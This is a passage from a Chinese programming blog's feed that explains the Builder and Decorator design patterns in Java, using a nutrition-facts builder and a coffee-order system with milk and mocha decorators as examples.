&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">calories&lt;/span> &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getCalories&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFat&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sodium&lt;/span> &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getSodium&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 建造者
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Builder&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 必选参数
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 可选
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> calories &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> fat &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> sodium &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">getCalories&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Builder &lt;span style="color:#a6e22e">setCalories&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> calories&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">calories&lt;/span> &lt;span style="color:#f92672">=&lt;/span> calories&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">getFat&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Builder &lt;span style="color:#a6e22e">setFat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> fat&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">fat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> fat&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">getSodium&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> sodium&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Builder &lt;span style="color:#a6e22e">setSodium&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> sodium&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sodium&lt;/span> &lt;span style="color:#f92672">=&lt;/span> sodium&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 建造者必选参数构造器
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param servingSize
&lt;/span>&lt;span style="color:#75715e"> * @param servings
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">Builder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> servingSize&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> servings&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servingSize&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servingSize&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">servings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> servings&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 通过内部类创建者的builder方法,调用外部类的构造器.
&lt;/span>&lt;span style="color:#75715e"> * 创建对象.
&lt;/span>&lt;span style="color:#75715e"> * builder类似构造器,能够对参数加约束条件.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> NutritionFactsBuilderPattern &lt;span style="color:#a6e22e">builder&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 可以在此对所有的参数做检查.凡是不满足条件的可以在此处就报错.这就是约束条件的check
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NutritionFactsBuilderPattern&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 客户端测试
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param args
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
NutritionFactsBuilderPattern&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Builder&lt;/span> builder &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NutritionFactsBuilderPattern&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Builder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>1&lt;span style="color:#f92672">,&lt;/span> 2&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// 通过builder来创建需要的不可变对象.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> NutritionFactsBuilderPattern obj &lt;span style="color:#f92672">=&lt;/span> builder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setCalories&lt;/span>&lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">setFat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>4&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">setSodium&lt;/span>&lt;span style="color:#f92672">(&lt;/span>5&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">builder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>分析示例代码，NutritionFactsBuilderPattern 是不可变类，保证了线程安全。建造者类的 set 与 get 方法保证了代码的易读性，并且在编译阶段就为用户提供了参数约束性检查。通过必须字段设置为 final 防止用户漏传必须字段。
建造者模式完美解决了我们的问题，还没有任何其他模式所带来的缺陷。所以它是当我们面临类似问题时应该优先选择的解决方案。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;ol>
&lt;li>建造者设计模式往往用来解决复杂对象的创建问题。&lt;/li>
&lt;li>工厂设计模式的重点在于为多个产品提供创建途径，用户直接和工厂打交道，并不关注产品本身的创建复杂度的问题。&lt;/li>
&lt;li>建造者设计模式重点在于产品本身的创建，用户直接与创建者打交道，主要解决的是复杂产品对象的创建问题。&lt;/li>
&lt;li>当一个对象的初始化参数多余 5 个，并且有可选，非可选参数的情况出现时，请直接选用建造者设计模式。&lt;/li>
&lt;/ol>
&lt;p>参考资料：《effectiveJava》&lt;/p></description></item><item><title>装饰器设计模式</title><link>https://www.chucklin.net/post/decorater_designmode/</link><pubDate>Fri, 05 Jan 2018 14:01:23 +0800</pubDate><guid>https://www.chucklin.net/post/decorater_designmode/</guid><description>&lt;h2 id="什么是装饰器设计模式">什么是装饰器设计模式&lt;/h2>
&lt;p>动态的将责任附加到对象身上。若要扩展功能，装饰着提供了比继承更有弹性的替代方案。&lt;/p>
&lt;h2 id="为什么要用装饰器设计模式">为什么要用装饰器设计模式&lt;/h2>
&lt;p>试想下面这样一种需求。你供职的咖啡店最近准备设计一套订单系统以满足日益膨胀的业务需要。最初的设计是这样的：
&lt;img src="http://static.zybuluo.com/mikumikulch/v9nlil6lw2kxaz6hb6t21uz5/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-24%20%E4%B8%8B%E5%8D%8810.43.48.png" alt="屏幕快照 2016-11-24 下午10.43.48.png-32.4kB">
Beverage 是一个抽象的饮料类。每种不同的咖啡，继承这个抽象类并提供不同的 cost 实现。也就是说，每种不同的类都有一个单独的实现，并且提供自己的 cost 方法。
顾客在购买咖啡时往往需要加入一些自己的调料，于是，你不得不为每一种调料的每一种饮料提供一个单独的实现类。哇塞，这简直是类爆炸！&lt;/p>
&lt;p>但是别担心，要知道我毕竟是一个面向对象程序员。&lt;/p>
&lt;p>我想到了一个点子，通过把各种调料设置到超类中，并提供一个 cost 方法计算所有调料的价格。然后在子类的 cost 中首先调用超类的 cost，然后与子类的 cost 方法的值相加后就可以得到某种饮料的价格，而不用为加入了不同调料的饮料设计单独的类了。
&lt;img src="http://static.zybuluo.com/mikumikulch/qh39na0yy502gyzey0y4eiln/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-24%20%E4%B8%8B%E5%8D%8811.11.09.png" alt="屏幕快照 2016-11-24 下午11.11.09.png-30.9kB">
像上面这样，子类依然会覆盖父类的 cost，但是会调用 setMilk() 等方法设置调料信息，然后调动父类的 cost 计算出调料的总价，再与子类的 cost 相加。&lt;/p>
&lt;p>遗憾的是，这样的设计依然不够好，它至少存在下面这些问题。&lt;/p>
&lt;ul>
&lt;li>如果调料的价格发生变动，我们需要修改超类中的代码。&lt;/li>
&lt;li>如果将来加入新的调料，我们需要修改超类中的代码。&lt;/li>
&lt;li>如果顾客需要双倍摩卡的咖啡我们应该怎么办？&lt;/li>
&lt;li>超类中包含的调料似乎并不能和所有饮料所吻合。&lt;/li>
&lt;/ul>
&lt;h2 id="装饰器设计模式怎么用">装饰器设计模式怎么用？&lt;/h2>
&lt;p>正当我一筹莫展的时候，有一个设计原则能够为我们提供一些思路&lt;/p>
&lt;blockquote>
&lt;p>类应该对扩展开放，对修改关闭。
现在，让我们改变一种思路，尝试以饮料为主题然后使用调料对象来装饰饮料，然后最终计算出价格的做法。
也就是利用装饰器设计模式来帮我们解决问题。&lt;/p>
&lt;/blockquote>
&lt;p>在正式开始之前，你需要知道一些装饰器设计模式的特点。&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>装饰器和被装饰对象具有相同的超类型。&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;ol>
&lt;li>你可以用一个或多个装饰器包装一个被装饰对象。&lt;/li>
&lt;li>装饰器和被装饰对象都用有同样的超类型。对于客户端来说，使用装饰器和被装饰对象，都应该拥有一样的体验。&lt;/li>
&lt;li>装饰者可以在所委托被装饰者的行为之前、或之后，加上自己的行为。&lt;/li>
&lt;li>对象可以动态的，任何时候被你的装饰器所装饰。&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/8inqari6f767suub69t23y66/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-24%20%E4%B8%8B%E5%8D%8811.53.32.png" alt="屏幕快照 2016-11-24 下午11.53.32.png-38.8kB">&lt;/p>
&lt;p>了解了装饰器设计模式的要点后，尝试在本次的咖啡订单系统上运用装饰器设计模式吧。&lt;/p>
&lt;p>整体设计：
&lt;img src="http://static.zybuluo.com/mikumikulch/ur3dmjlt9lsxde1tmrhc6w1h/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-25%20%E4%B8%8A%E5%8D%8812.06.23.png" alt="屏幕快照 2016-11-25 上午12.06.23.png-41.9kB">&lt;/p>
&lt;p>饮料的抽象类中拥有抽象的 cost() 方法，与被实现了的 getDescription 方法。
HouseBlend 与 Decaf 对象分别是抽象的饮料的实现，并且覆盖了 cost() 方法，实现了自己的逻辑。
Decorator 是一个装饰器抽象类（或接口）。按照上述装饰器的定义，为了让客户端的使用体验一致，Decorator 必须具有与被装饰对象同样的类型。装饰器可以选择实现被装饰对象的方法，也可以选择不实现。并且，每个装饰器都应该包含一个被装饰对象的实例，以便于在装饰器中调用被装饰对象的方法。
最后，每种不同的调料都是一个具体的装饰器实现。除了继承了装饰器对象以外还需要覆盖你想要装饰的被装饰方法。&lt;/p>
&lt;h3 id="被装饰对象">被装饰对象&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 装饰器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 被装饰饮料抽象类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Beverage&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> String description&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> String &lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> description&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setDescription&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String description&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">description&lt;/span> &lt;span style="color:#f92672">=&lt;/span> description&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 装饰器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 被装饰对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Decaf&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Beverage &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">Decaf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String description&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setDescription&lt;/span>&lt;span style="color:#f92672">(&lt;/span>description&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 返回decaf饮品的价格
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> 30&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">package&lt;/span> designpattern.decorator&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 装饰器设计模式
&lt;/span>&lt;span style="color:#75715e"> * HouseBlend
&lt;/span>&lt;span style="color:#75715e"> * 饮品实现类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">HouseBlend&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Beverage &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 30元
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> 30&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">HouseBlend&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String description&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
setDescription&lt;span style="color:#f92672">(&lt;/span>description&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="装饰器类">装饰器类&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 装饰器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 装饰器抽象类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Decorator&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Beverage &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> Beverage beverage&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> Beverage &lt;span style="color:#a6e22e">getBeverage&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> beverage&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setBeverage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Beverage beverage&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">beverage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> beverage&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 装饰器必须重写此方法
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> String &lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">package&lt;/span> designpattern.decorator&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 装饰器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 牛奶调料装饰器
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Milk&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Decorator &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">Milk&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Beverage beverage&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">beverage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> beverage&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 重写cost方法
&lt;/span>&lt;span style="color:#75715e"> * 调用被装饰者的方法再加上本身调料的价格
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> 5 &lt;span style="color:#f92672">+&lt;/span> beverage&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> String &lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;牛奶&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> beverage&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">package&lt;/span> designpattern.decorator&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 装饰器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 调料装饰器类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Mocha&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Decorator &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">Mocha&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Beverage beverage&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">beverage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> beverage&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 重写cost方法。返回被装饰后的价格
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> beverage&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">cost&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> 6&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> String &lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;抹茶&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> beverage&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDescription&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="测试">测试&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 装饰器设计模式
&lt;/span>&lt;span style="color:#75715e"> * 测试类
